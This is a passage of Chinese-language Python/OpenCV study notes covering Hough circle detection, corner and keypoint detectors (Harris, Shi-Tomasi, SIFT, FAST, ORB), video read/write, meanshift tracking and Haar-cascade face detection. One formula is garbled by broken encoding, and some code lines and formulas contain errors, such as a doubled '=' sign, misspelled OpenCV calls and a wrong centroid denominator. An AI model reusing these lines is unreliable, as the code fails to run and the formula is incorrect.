plt.figure(figsize=(10,8),dpi=100)
plt.imshow(img[:,:,::-1]),plt.title('霍夫变换线检测')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127173311818](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127173311818.png)

#### 6-3 霍夫圆检测

1. 

2. 原理

   圆的表示式是：(�−�)2+(�−�)2=�(*x*−*a*)2+(*y*−*b*)2=*r*其中�*a*和�*b*表示圆心坐标，�*r*表示圆半径，因此标准的霍夫圆检测就是在这三个参数组成的三维空间累加器上进行圆形检测，此时效率就会很低，所以OpenCV中使用**霍夫梯度法**进行圆形的检测。

   霍夫梯度法将霍夫圆检测范围两个阶段，第一阶段检测圆心，第二阶段利用圆心推导出圆半径。

   - 圆心检测的原理：圆心是圆周法线的交汇处，设置一个阈值，在某点的相交的直线的条数大于这个阈值就认为该交汇点为圆心。
   - 圆半径确定原理：圆心到圆周上的距离（半径）是相同的，确定一个阈值，只要相同距离的数量大于该阈值，就认为该距离是该圆心的半径。

   原则上霍夫变换可以检测任何形状，但复杂的形状需要的参数就多，霍夫空间的维数就多，因此在程序实现上所需的内存空间以及运行效率上都不利于把标准霍夫变换应用于实际复杂图形的检测中。霍夫梯度法是霍夫变换的改进，它的目的是减小霍夫空间的维度，提高效率。

3. API

   在OpenCV中检测图像中的圆环使用的是API是：

   ```python
   circles = cv.HoughCircles(image, method, dp, minDist, param1=100, param2=100, minRadius=0,maxRadius=0 )
   ```

   参数：

   - image：输入图像，应输入灰度图像
   - method：使用霍夫变换圆检测的算法，它的参数是CV_HOUGH_GRADIENT
   - dp：霍夫空间的分辨率，dp=1时表示霍夫空间与输入图像空间的大小一致，dp=2时霍夫空间是输入图像空间的一半，以此类推
   - minDist为圆心之间的最小距离，如果检测到的两个圆心之间距离小于该值，则认为它们是同一个圆心
   - param1：边缘检测时使用Canny算子的高阈值，低阈值是高阈值的一半。
   - param2：检测圆心和确定半径时所共有的阈值
   - minRadius和maxRadius为所检测到的圆半径的最小值和最大值

   返回：

   - circles：输出圆向量，包括三个浮点型的元素——圆心横坐标，圆心纵坐标和圆半径

4. 实现

   由于霍夫圆检测对噪声比较敏感，所以首先对图像进行中值滤波。

   ```python
   import cv2 as cv
   import numpy as np
   import matplotlib.pyplot as plt
   # 1 读取图像，并转换为灰度图
   planets = cv.imread("./image/star.jpeg")
   gay_img = cv.cvtColor(planets, cv.COLOR_BGRA2GRAY)
   # 2 进行中值模糊，去噪点
   img = cv.medianBlur(gay_img, 7)  
   # 3 霍夫圆检测
   circles = cv.HoughCircles(img, cv.HOUGH_GRADIENT, 1, 200, param1=100, param2=30, minRadius=0, maxRadius=100)
   # 4 将检测结果绘制在图像上
   for i in circles[0, :]:  # 遍历矩阵每一行的数据
       # 绘制圆形
       cv.circle(planets, (i[0], i[1]), i[2], (0, 255, 0), 2)
       # 绘制圆心
       cv.circle(planets, (i[0], i[1]), 2, (0, 0, 255), 3)
   # 5 图像显示
   plt.figure(figsize=(10,8),dpi=100)
   plt.imshow(planets[:,:,::-1]),plt.title('霍夫变换圆检测')
   plt.xticks([]), plt.yticks([])
   plt.show()
   ```

![image-20240127183316314](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127183316314.png)





## 3，图像的特征提取和描述

### 3-1 Harris角点检测

在OpenCV中实现Hariis检测使用的API是：

```python
dst=cv.cornerHarris(src, blockSize, ksize, k)
```

参数：

- img：数据类型为 ﬂoat32 的输入图像。
- blockSize：角点检测中要考虑的邻域大小。
- ksize：sobel求导使用的核大小
- k ：角点检测方程中的自由参数，取值参数为 [0.04，0.06].

示例：

```python
import cv2 as cv
import numpy as np 
import matplotlib.pyplot as plt
# 1 读取图像，并转换成灰度图像
img = cv.imread('./image/chessboard.jpg')
gray = cv.cvtColor(img, cv.COLOR_BGR2GRAY)
# 2 角点检测
# 2.1 输入图像必须是 float32
gray = np.float32(gray)

# 2.2 最后一个参数在 0.04 到 0.05 之间
dst = cv.cornerHarris(gray,2,3,0.04)
# 3 设置阈值，将角点绘制出来，阈值根据图像进行选择
img[dst>0.001*dst.max()] = [0,0,255]
# 4 图像显示
plt.figure(figsize=(10,8),dpi=100)
plt.imshow(img[:,:,::-1]),plt.title('Harris角点检测')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127190622525](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127190622525.png)

Harris角点检测的优缺点：

优点：

- 旋转不变性，椭圆转过一定角度但是其形状保持不变（特征值保持不变）
- 对于图像灰度的仿射变化具有部分的不变性，由于仅仅使用了图像的一介导数，对于图像灰度平移变化不变；对于图像灰度尺度变化不变

缺点：

- 对尺度很敏感，不具备几何尺度不变性。
- 提取的角点是像素级的

### 3-2 Shi-Tomasi角点检测

在OpenCV中实现Shi-Tomasi角点检测使用API:

```python
corners = cv2.goodFeaturesToTrack ( image, maxcorners, qualityLevel, minDistance )
```

参数：

- Image: 输入灰度图像
- maxCorners : 获取角点数的数目。
- qualityLevel：该参数指出最低可接受的角点质量水平，在0-1之间。
- minDistance：角点之间最小的欧式距离，避免得到相邻特征点。

返回：

- Corners: 搜索到的角点，在这里所有低于质量水平的角点被排除掉，然后把合格的角点按质量排序，然后将质量较好的角点附近（小于最小欧式距离）的角点删掉，最后找到maxCorners个角点返回。

**示例：**

```python
import numpy as np
import cv2 as cv
import matplotlib.pyplot as plt
# 1 读取图像
img = cv.imread('./img/tv.jpg')
gray = cv.cvtColor(img,cv.COLOR_BGR2GRAY)
# 2 角点检测
corners = cv.goodFeaturesToTrack(gray,1000,0.01,10)
# 3 绘制角点
for i in corners:
    x,y = i.ravel()
    cv.circle(img,(int(x),int(y)),2,(0,0,255),-1)
# 4 图像展示
plt.figure(figsize=(10,8),dpi=100)
plt.imshow(img[:,:,::-1]),plt.title('shi-tomasi角点检测')
plt.xticks([]), plt.yticks([])
plt.show()
```

结果如下：

![image-20240127193051968](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127193051968.png)



**总结**

1. Harris算法

   思想：通过图像的局部的小窗口观察图像，角点的特征是窗口沿任意方向移动都会导致图像灰度的明显变化。

   API: cv.cornerHarris()

2. Shi-Tomasi算法

   对Harris算法的改进，能够更好地检测角点

   API: cv2.goodFeatureToTrack()

### 3-3 SIFT/SURF算法

在OpenCV中利用SIFT检测关键点的流程如下所示：

#### 3-1 实例化sift

```python
sift = cv.xfeatures2d.SIFT_create()
```

#### 3-2 利用sift.detectAndCompute()检测关键点并计算

```python
kp,des = sift.detectAndCompute(gray,None)
```

参数：

- gray: 进行关键点检测的图像，注意是灰度图像

返回：

- kp: 关键点信息，包括位置，尺度，方向信息
- des: 关键点描述符，每个关键点对应128个梯度信息的特征向量

#### 3- 3.将关键点检测结果绘制在图像上

```python
cv.drawKeypoints(image, keypoints, outputimage, color, flags)
```

参数：

- image: 原始图像
- keypoints：关键点信息，将其绘制在图像上
- outputimage：输出图片，可以是原始图像
- color：颜色设置，通过修改（b,g,r）的值,更改画笔的颜色，b=蓝色，g=绿色，r=红色。
- flags：绘图功能的标识设置
  1. cv2.DRAW_MATCHES_FLAGS_DEFAULT：创建输出图像矩阵，使用现存的输出图像绘制匹配对和特征点，对每一个关键点只绘制中间点
  2. cv2.DRAW_MATCHES_FLAGS_DRAW_OVER_OUTIMG：不创建输出图像矩阵，而是在输出图像上绘制匹配对
  3. cv2.DRAW_MATCHES_FLAGS_DRAW_RICH_KEYPOINTS：对每一个特征点绘制带大小和方向的关键点图形
  4. cv2.DRAW_MATCHES_FLAGS_NOT_DRAW_SINGLE_POINTS：单点的特征点不被绘制

SURF算法的应用与上述流程是一致，这里就不在赘述。

示例：

利用SIFT算法在中央电视台的图片上检测关键点，并将其绘制出来：

```python
import cv2 as cv 
import numpy as np
import matplotlib.pyplot as plt
# 1 读取图像
img = cv.imread('./image/tv.jpg')
gray= cv.cvtColor(img,cv.COLOR_BGR2GRAY)
# 2 sift关键点检测
# 2.1 实例化sift对象
sift = cv.xfeatures2d.SIFT_create()

# 2.2 关键点检测：kp关键点信息包括方向，尺度，位置信息，des是关键点的描述符
kp,des=sift.detectAndCompute(gray,None)
# 2.3 在图像上绘制关键点的检测结果
cv.drawKeypoints(img,kp,img,flags=cv.DRAW_MATCHES_FLAGS_DRAW_RICH_KEYPOINTS)
# 3 图像显示
plt.figure(figsize=(8,6),dpi=100)
plt.imshow(img[:,:,::-1]),plt.title('sift检测')
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127194522892](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127194522892.png)



- 

---

### 3-4 Fast算法

#### 1-1 原理

我们前面已经介绍过几个特征检测器，它们的效果都很好，特别是SIFT和SURF算法，但是从实时处理的角度来看，效率还是太低了。为了解决这个问题，Edward Rosten和Tom Drummond在2006年提出了FAST算法，并在2010年对其进行了修正。

**FAST** (全称Features from accelerated segment test)是一种用于角点检测的算法，该算法的原理是取图像中检测点，以该点为圆心的周围邻域内像素点判断检测点是否为角点，通俗的讲就是**若一个像素周围有一定数量的像素与该点像素值不同，则认为其为角点**。

##### 1.1.1 **FAST算法的基本流程**

1. 在图像中选取一个像素点 p，来判断它是不是关键点。$$I_p$$等于像素点 p的灰度值。

2. 以r为半径画圆，覆盖p点周围的M个像素，通常情狂下，设置 r=3，则 M=16，如下图所示：

   ![image17](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image17.jpg)

3. 设置一个阈值t，如果在这 16 个像素点中存在 n 个连续像素点的灰度值都高于$$I_p + t$$，或者低于$$I_p - t$$，那么像素点 p 就被认为是一个角点。如上图中的虚线所示，n 一般取值为 12。

4. 由于在检测特征点时是需要对图像中所有的像素点进行检测，然而图像中的绝大多数点都不是特征点，如果对每个像素点都进行上述的检测过程，那显然会浪费许多时间，因此采用一种进行**非特征点判别**的方法：首先对候选点的周围每个 90 度的点：1，9，5，13 进行测试（先测试 1 和 19, 如果它们符合阈值要求再测试 5 和 13）。如果 p 是角点，那么这四个点中至少有 3 个要符合阈值要求，否则直接剔除。对保留下来的点再继续进行测试（是否有 12 的点符合阈值要求）。 

虽然这个检测器的效率很高，但它有以下几条缺点：

- 获得的候选点比较多
- 特征点的选取不是最优的，因为它的效果取决与要解决的问题和角点的分布情况。
- 进行非特征点判别时大量的点被丢弃
- 检测到的很多特征点都是相邻的

前 3 个问题可以通过机器学习的方法解决，最后一个问题可以使用非最大值抑制的方法解决。

##### **1.1.2 机器学习的角点检测器**

1. 选择一组训练图片（最好是跟最后应用相关的图片）

2. 使用 FAST 算法找出每幅图像的特征点，对图像中的每一个特征点，将其周围的 16 个像素存储构成一个向量P。

   ![image-20191010114459269](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20191010114459269.png)

3. 每一个特征点的 16 像素点都属于下列三类中的一种

   ![image18](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image18.jpg)

4. 根据这些像素点的分类，特征向量 P 也被分为 3 个子集：Pd ，Ps ，Pb，

5. 定义一个新的布尔变量$$K_p$$，如果 p 是角点就设置为 Ture，如果不是就设置为 False。

6. 利用特征值向量p，目标值是$K_p$，训练ID3 树（决策树分类器）。

7. 将构建好的决策树运用于其他图像的快速的检测。

##### 1.1.3 **非极大值抑制**



**在筛选出来的候选角点中有很多是紧挨在一起的，需要通过非极大值抑制来消除这种影响。**

为所有的候选角点都确定一个打分函数$$V $$ ， $$V $$的值可这样计算：先分别计算$$I_p$$与圆上16个点的像素值差值，取绝对值，再将这16个绝对值相加，就得到了$$V $$的值
$$
V = \sum_{i}^{16}|I_p-I_i|
$$
最后比较毗邻候选角点的 V 值，把V值较小的候选角点pass掉。

FAST算法的思想与我们对角点的直观认识非常接近，化繁为简。FAST算法比其它角点的检测算法快，但是在噪声较高时不够稳定，这需要设置合适的阈值。

#### 1-2 实现

OpenCV中的FAST检测算法是用传统方法实现的，

**1.实例化fast**

```python
fast = =cv.FastFeatureDetector_create( threshold, nonmaxSuppression)
```

参数：

- threshold：阈值t，有默认值10
- nonmaxSuppression：是否进行非极大值抑制，默认值True

返回：

- Fast：创建的FastFeatureDetector对象

**2.利用fast.detect检测关键点，没有对应的关键点描述**

```python
kp = fast.detect(grayImg, None)
```

参数：

- gray: 进行关键点检测的图像，注意是灰度图像

返回：

- kp: 关键点信息，包括位置，尺度，方向信息

**3.将关键点检测结果绘制在图像上，与在sift中是一样的**

```python
cv.drawKeypoints(image, keypoints, outputimage, color, flags)
```

示例：

```python
import numpy as np
import cv2 as cv
from matplotlib import pyplot as plt
# 1 读取图像
img = cv.imread('./image/tv.jpg')
# 2 Fast角点检测
# 2.1 创建一个Fast对象，传入阈值，注意：可以处理彩色空间图像
fast = cv.FastFeatureDetector_create(threshold=30)

# 2.2 检测图像上的关键点
kp = fast.detect(img,None)
# 2.3 在图像上绘制关键点
img2 = cv.drawKeypoints(img, kp, None, color=(0,0,255))

# 2.4 输出默认参数
print( "Threshold: {}".format(fast.getThreshold()) )
print( "nonmaxSuppression:{}".format(fast.getNonmaxSuppression()) )
print( "neighborhood: {}".format(fast.getType()) )
print( "Total Keypoints with nonmaxSuppression: {}".format(len(kp)) )


# 2.5 关闭非极大值抑制
fast.setNonmaxSuppression(0)
kp = fast.detect(img,None)

print( "Total Keypoints without nonmaxSuppression: {}".format(len(kp)) )
# 2.6 绘制为进行非极大值抑制的结果
img3 = cv.drawKeypoints(img, kp, None, color=(0,0,255))

# 3 绘制图像
fig,axes=plt.subplots(nrows=1,ncols=2,figsize=(10,8),dpi=100)
axes[0].imshow(img2[:,:,::-1])
axes[0].set_title("加入非极大值抑制")
axes[1].imshow(img3[:,:,::-1])
axes[1].set_title("未加入非极大值抑制")
plt.show()
```

结果：

![image-20191010120822413](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20191010120822413-17063577166409.png)



---

### 3-5  ORB 算法

#### 2.1 原理

SIFT和SURF算法是受专利保护的，在使用他们时我们是要付费的，但是ORB（Oriented Fast and Rotated Brief）不需要，它可以用来对图像中的关键点快速创建特征向量，并用这些特征向量来识别图像中的对象。

##### 2.1.1 ORB算法流程

ORB算法结合了Fast和Brief算法，提出了构造金字塔，为Fast特征点添加了方向，从而使得关键点具有了尺度不变性和旋转不变性。具体流程描述如下：

- 构造尺度金字塔，金字塔共有n层，与SIFT不同的是，每一层仅有一幅图像。第s层的尺度为：

$$
\sigma_s=\sigma_0^s
$$

$$\sigma_0$$是初始尺度，默认为1.2，原图在第0层。

![image-20191010145652681](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20191010145652681-17063575560515.png)

第s层图像的大小：
$$
SIZE = (H*\frac{1}{\sigma_s})\times(W*\frac{1}{\sigma_s})
$$


- 在不同的尺度上利用Fast算法检测特征点，采用Harris角点响应函数，根据角点的响应值排序，选取前N个特征点，作为本尺度的特征点。

- 计算特征点的主方向，计算以特征点为圆心半径为r的圆形邻域内的灰度质心位置，将从特征点位置到质心位置的方向做特征点的主方向。

计算方法如下:
$$
m_{pq}=\sum_{x,y}x^py^qI(x,y)
$$
质心位置：
$$
C=(\frac{m_{10}}{m_{00}},\frac{m_{01}}{m_{10}})
$$
主方向：
$$
\theta = arctan(m_{01},m_{10})
$$

- 为了解决旋转不变性，将特征点的邻域旋转到主方向上利用Brief算法构建特征描述符，至此就得到了ORB的特征描述向量。

##### 2.1.2 BRIEF算法

**BRIEF是一种特征描述子提取算法，并非特征点的提取算法，一种生成二值化描述子的算法，不提取代价低，匹配只需要使用简单的汉明距离(Hamming Distance)利用比特之间的异或操作就可以完成。因此，时间代价低，空间代价低，效果还挺好是最大的优点。**

**算法的步骤介绍如下**：

1. **图像滤波**：原始图像中存在噪声时，会对结果产生影响，所以需要对图像进行滤波，去除部分噪声。

2. **选取点对**：以特征点为中心，取S*S的邻域窗口，在窗口内随机选取N组点对，一般N=128,256,512，默认是256，关于如何选取随机点对，提供了五种形式，结果如下图所示：

   - x,y方向平均分布采样

   - x,y均服从Gauss(0,S^2/25)各向同性采样

   - x服从Gauss(0,S^2/25)，y服从Gauss(0,S^2/100)采样

   - x,y从网格中随机获取

   - x一直在(0,0)，y从网格中随机选取

     ![image-20191010153907973](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20191010153907973-17063575560516.png)

   图中一条线段的两个端点就是一组点对，其中第二种方法的结果比较好。

3. **构建描述符**：假设x,y是某个点对的两个端点，p(x),p(y)是两点对应的像素值，则有：
   $$
   t(x,y)=\begin{cases}1	&if p(x)>p(y)\\
   0&	else\end{cases}
   $$
   对每一个点对都进行上述的二进制赋值，形成BRIEF的关键点的描述特征向量，该向量一般为 128-512 位的字符串，其中仅包含 1 和 0，如下图所示：

   ![image-20191010161944491](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20191010161944491-17063575560517.png)

#### 2-2 实现

在OPenCV中实现ORB算法，使用的是：

**1.实例化ORB**

```python
orb = cv.xfeatures2d.orb_create(nfeatures)
```

参数：

- nfeatures: 特征点的最大数量

**2.利用orb.detectAndCompute()检测关键点并计算**

```python
kp,des = orb.detectAndCompute(gray,None)
```

参数：

- gray: 进行关键点检测的图像，注意是灰度图像

返回：

- kp: 关键点信息，包括位置，尺度，方向信息
- des: 关键点描述符，每个关键点BRIEF特征向量，二进制字符串，

**3.将关键点检测结果绘制在图像上**

```python
cv.drawKeypoints(image, keypoints, outputimage, color, flags)
```

**示例：**

```python
import numpy as np
import cv2 as cv
from matplotlib import pyplot as plt
# 1 图像读取
img = cv.imread('./image/tv.jpg')

# 2 ORB角点检测
# 2.1 实例化ORB对象
orb = cv.ORB_create(nfeatures=500)
# 2.2 检测关键点,并计算特征描述符
kp,des = orb.detectAndCompute(img,None)

print(des.shape)

# 3 将关键点绘制在图像上
img2 = cv.drawKeypoints(img, kp, None, color=(0,0,255), flags=0)

# 4. 绘制图像
plt.figure(figsize=(10,8),dpi=100)
plt.imshow(img2[:,:,::-1])
plt.xticks([]), plt.yticks([])
plt.show()
```

![image-20240127201959110](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127201959110.png)

---

## 4，视频操作

### 4-1 视频读写

#### 4-1-1 从文件中读取视频并播放

在OpenCV中我们要获取一个视频，需要创建一个VideoCapture对象，指定你要读取的视频文件：

**1-1** **创建读取视频的对象**

```python
cap = cv.VideoCapture(filepath)
```

参数：

- filepath: 视频文件路径

视频的属性信息

**2.1. 获取视频的某些属性，**

```python
retval = cap.get(propId)
```

参数：

- propId: 从0到18的数字，每个数字表示视频的属性

  常用属性有：

  ![image-20240127220126914](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127220126914.png)

**2.2 修改视频的属性信息**

```python
cap.set(propId，value)
```

参数：

- proid: 属性的索引，与上面的表格相对应
- value: 修改后的属性值

1. 判断图像是否读取成功

   ```python
   isornot = cap.isOpened()
   ```

   - 若读取成功则返回true，否则返回False

2. 获取视频的一帧图像

   ```python
   ret, frame = cap.read()
   ```

   参数：

   - ret: 若获取成功返回True，获取失败，返回False
   - Frame: 获取到的某一帧的图像

3. 调用cv.imshow()显示图像，在显示图像时使用cv.waitkey()设置适当的持续时间，如果太低视频会播放的非常快，如果太高就会播放的非常慢，通常情况下我们设置25ms就可以了。

4. 最后，调用cap.realease()将视频释放掉

示例：

```python
import numpy as np
import cv2 as cv
# 1.获取视频对象
cap = cv.VideoCapture('DOG.wmv')
# 2.判断是否读取成功
while(cap.isOpened()):
    # 3.获取每一帧图像
    ret, frame = cap.read()
    # 4. 获取成功显示图像
    if ret == True:
        cv.imshow('frame',frame)
    # 5.每一帧间隔为25ms
    if cv.waitKey(25) & 0xFF == ord('q'):
        break
# 6.释放视频对象
cap.release()
cv.destoryAllwindows()
```

#### 4-1-2 保存视频

在OpenCV中我们保存视频使用的是VedioWriter对象，在其中指定输出文件的名称，如下所示：

1. 创建视频写入的对象

```python
out = cv2.VideoWriter(filename,fourcc, fps, frameSize)
```

参数：

- filename：视频保存的位置

- fourcc：指定视频编解码器的4字节代码

- fps：帧率

- frameSize：帧大小

- 设置视频的编解码器，如下所示，

  ```
  retval = cv2.VideoWriter_fourcc( c1, c2, c3, c4 )
  ```

  参数：

  - c1,c2,c3,c4: 是视频编解码器的4字节代码，在[fourcc.org](http://www.fourcc.org/codecs.php)中找到可用代码列表，与平台紧密相关，常用的有：

    ###### 在Windows中：DIVX（.avi）

    ###### 在OS中：MJPG（.mp4），DIVX（.avi），X264（.mkv）。

- 利用cap.read()获取视频中的每一帧图像，并使用out.write()将某一帧图像写入视频中。

- 使用cap.release()和out.release()释放资源。

示例：

```python
import cv2 as cv
import numpy as np

# 1. 读取视频
cap = cv.VideoCapture("DOG.wmv")

# 2. 获取图像的属性（宽和高，）,并将其转换为整数
frame_width = int(cap.get(3))
frame_height = int(cap.get(4))

# 3. 创建保存视频的对象，设置编码格式，帧率，图像的宽高等
out = cv.VideoWriter('outpy.avi',cv.VideoWriter_fourcc('M','J','P','G'), 10, (frame_width,frame_height))
while(True):
    # 4.获取视频中的每一帧图像
    ret, frame = cap.read()
    if ret == True: 
        # 5.将每一帧图像写入到输出文件中
        out.write(frame)
    else:
        break 

# 6.释放资源
cap.release()
out.release()
cv.destroyAllWindows()
```

------

**总结**

1. 读取视频：
   - 读取视频：cap = cv.VideoCapture()
   - 判断读取成功：cap.isOpened()
   - 读取每一帧图像：ret,frame = cap.read()
   - 获取属性：cap.get(proid)
   - 设置属性：cap.set(proid,value)
   - 资源释放：cap.release()
2. 保存视频
   - 保存视频： out = cv.VideoWrite()
   - 视频写入：out.write()
   - 资源释放：out.release()



```python
import numpy as np
import cv2 as cv

# 1 获取视频
cap = cv.VideoCapture('image/DOG.wmv')

# 2 指定追踪目标
ret,frame = cap.read()
r,h,c,w=197,141,0,208
win = (c,r,w,h)
roi = frame[r:r+h,c:c+w]

# 3 计算直方图
hsv_roi = cv.cvtColor(roi,cv.COLOR_BGR2HSV)
roi_hist = cv.calcHist([hsv_roi],[0],None,[180],[0,180])
cv.normalize(roi_hist,roi_hist,0,255,cv.NORM_MINMAX)

# 4 目标追踪
term = (cv.TERM_CRITERIA_EPS|cv.TERM_CRITERIA_COUNT,10,1)

while(True):
    ret,frame = cap.read()
    if ret ==True:
        hst = cv.cvtColor(frame,cv.COLOR_BGR2HSV)
        dst = cv.calcBackProject([hst],[0],roi_hist,[0,180],1)
        ret,win = cv.meanShift(dst,win,term)

        x,y,w,h = win
        img2 = cv.rectangle(frame,(x,y),(x+w,y+h),255,2)
        cv.imshow("frame",img2)
        if cv.waitKey(60)&0xFF ==ord('q'):
            break


# 5 释放资源
cap.release()
cv.destroyAllWindows()
```

## 5，人脸识别案例

### 5-1 基础

我们使用机器学习的方法完成人脸检测，首先需要大量的正样本图像（面部图像）和负样本图像（不含面部的图像）来训练分类器。我们需要从其中提取特征。下图中的 Haar 特征会被使用，就像我们的卷积核，每一个特征是一 个值，这个值等于黑色矩形中的像素值之后减去白色矩形中的像素值之和。

![image-20240127223249553](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127223249553.png)

Haar特征值反映了图像的灰度变化情况。例如：脸部的一些特征能由矩形特征简单的描述，眼睛要比脸颊颜色要深，鼻梁两侧比鼻梁颜色要深，嘴巴比周围颜色要深等。

Haar特征可用于于图像任意位置，大小也可以任意改变，所以矩形特征值是矩形模版类别、矩形位置和矩形大小这三个因素的函数。故类别、大小和位置的变化，使得很小的检测窗口含有非常多的矩形特征。

![image-20240127223300408](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127223300408.png)

得到图像的特征后，训练一个决策树构建的adaboost级联决策器来识别是否为人脸。

![image-20240127223312363](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127223312363.png)

### 5-2.实现

OpenCV中自带已训练好的检测器，包括面部，眼睛，猫脸等，都保存在XML文件中，我们可以通过以下程序找到他们：

```python
import cv2 as cv
print(cv.__file__)
```

找到的文件如下所示：

![image-20240127223338348](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127223338348.png)

那我们就利用这些文件来识别人脸，眼睛等。检测流程如下：

1. 读取图片，并转换成灰度图

2. 实例化人脸和眼睛检测的分类器对象

   ```python
   # 实例化级联分类器
   classifier =cv.CascadeClassifier( "haarcascade_frontalface_default.xml" ) 
   # 加载分类器
   classifier.load('haarcascade_frontalface_default.xml')
   ```

3. 进行人脸和眼睛的检测

   ```python
   rect = classifier.detectMultiScale(gray, scaleFactor, minNeighbors, minSize,maxsize)
   ```

   参数：

   - Gray: 要进行检测的人脸图像
   - scaleFactor: 前后两次扫描中，搜索窗口的比例系数
   - minneighbors：目标至少被检测到minNeighbors次才会被认为是目标
   - minsize和maxsize: 目标的最小尺寸和最大尺寸

4. 将检测结果绘制出来就可以了。

主程序如下所示：

```python
import cv2 as cv
import matplotlib.pyplot as plt
# 1.以灰度图的形式读取图片
img = cv.imread("16.jpg")
gray = cv.cvtColor(img,cv.COLOR_BGR2GRAY)

# 2.实例化OpenCV人脸和眼睛识别的分类器 
face_cas = cv.CascadeClassifier( "haarcascade_frontalface_default.xml" ) 
face_cas.load('haarcascade_frontalface_default.xml')

eyes_cas = cv.CascadeClassifier("haarcascade_eye.xml")
eyes_cas.load("haarcascade_eye.xml")

# 3.调用识别人脸 
faceRects = face_cas.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) 
for faceRect in faceRects: 
    x, y, w, h = faceRect 
    # 框出人脸 
    cv.rectangle(img, (x, y), (x + h, y + w),(0,255,0), 3) 
    # 4.在识别出的人脸中进行眼睛的检测
    roi_color = img[y:y+h, x:x+w]
    roi_gray = gray[y:y+h, x:x+w]
    eyes = eyes_cas.detectMultiScale(roi_gray) 
    for (ex,ey,ew,eh) in eyes:
        cv.rectangle(roi_color,(ex,ey),(ex+ew,ey+eh),(0,255,0),2)
# 5. 检测结果的绘制
plt.figure(figsize=(8,6),dpi=100)
plt.imshow(img[:,:,::-1]),plt.title('检测结果')
plt.xticks([]), plt.yticks([])
plt.show()
```

结果：

![image-20240127223403034](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20240127223403034.png)

```python
import cv2 as cv
import matplotlib.pyplot as plt
img = cv.imread('./img/yangzi.jpg')
gray = cv.cvtColor(img,cv.COLOR_BGR2GRAY)

# 实例化检测器
face_cas = cv.CascadeClassifier( "D:\\Users\\anaconda3\\Lib\\site-packages\\cv2\\data\\haarcascade_frontalface_default.xml" )
face_cas.load('D:\\Users\\anaconda3\\Lib\\site-packages\\cv2\\data\\haarcascade_frontalface_default.xml')

eyes_cas = cv.CascadeClassifier("D:\\Users\\anaconda3\\Lib\\site-packages\cv2\\data\\haarcascade_eye.xml")
eyes_cas.load("D:\\Users\\anaconda3\\Lib\\site-packages\cv2\\data\\haarcascade_eye.xml")

# 人脸检测
face_rects = face_cas.detectMultiScale(gray,scaleFactor =1.2,minNeighbors = 3,minSize=(32,32))
# 绘制人脸检测眼睛
for facerect in face_rects:
    x,y,w,h = facerect
    cv.rectangle(img,(x,y),(x+w,y+h),(0,255,0),3)
    roi_color = img[y:y+h,x:x+w]
    roi_gray = gray[y:y+h,x:x+w]
    eyes = eyes_cas.detectMultiScale(roi_gray)
    for (ex,ey,ew,eh) in eyes:
        cv.rectangle(roi_color,(ex,ey),(ex+ew,ey+eh),(0,255,0),3)

plt.figure(figsize=(8,6),dpi=100)
plt.imshow(img[:,:,::-1]),plt.title('检测结果')
plt.xticks([]), plt.yticks([])
plt.imshow(img[:,:,::-1])
```

我们也可在视频中对人脸进行检测：

```python
import cv2 as cv
import matplotlib.pyplot as plt
# 1.读取视频
cap = cv.VideoCapture("movie.mp4")
# 2.在每一帧数据中进行人脸识别
while(cap.isOpened()):
    ret, frame = cap.read()
    if ret==True:
        gray = cv.cvtColor(frame, cv.COLOR_BGR2GRAY)
        # 3.实例化OpenCV人脸识别的分类器 
        face_cas = cv.CascadeClassifier( "haarcascade_frontalface_default.xml" ) 
        face_cas.load('haarcascade_frontalface_default.xml')
        # 4.调用识别人脸 
        faceRects = face_cas.detectMultiScale(gray, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) 
        for faceRect in faceRects: 
            x, y, w, h = faceRect 
            # 框出人脸 
            cv.rectangle(frame, (x, y), (x + h, y + w),(0,255,0), 3) 
        cv.imshow("frame",frame)
        if cv.waitKey(1) & 0xFF == ord('q'):
            break
# 5. 释放资源
cap.release()  
cv.destroyAllWindows()
```

------

**总结**

opencv中人脸识别的流程是：

1. 读取图片，并转换成灰度图
2. 实例化人脸和眼睛检测的分类器对象

```python
# 实例化级联分类器
classifier =cv.CascadeClassifier( "haarcascade_frontalface_default.xml" ) 
# 加载分类器
classifier.load('haarcascade_frontalface_default.xml')
```

1. 进行人脸和眼睛的检测

```python
rect = classifier.detectMultiScale(gray, scaleFactor, minNeighbors, minSize,maxsize)
```

1. 将检测结果绘制出来就可以了。

我们也可以在视频中进行人脸识别

# 十九，Numpy教程

## 1-1 安装

### 1-1-1 使用已有的发行版本

对于许多用户，尤其是在 Windows 上，最简单的方法是下载以下的 Python 发行版，它们包含了所有的关键包（包括 NumPy，SciPy，matplotlib，IPython，SymPy 以及 Python 核心自带的其它包）：

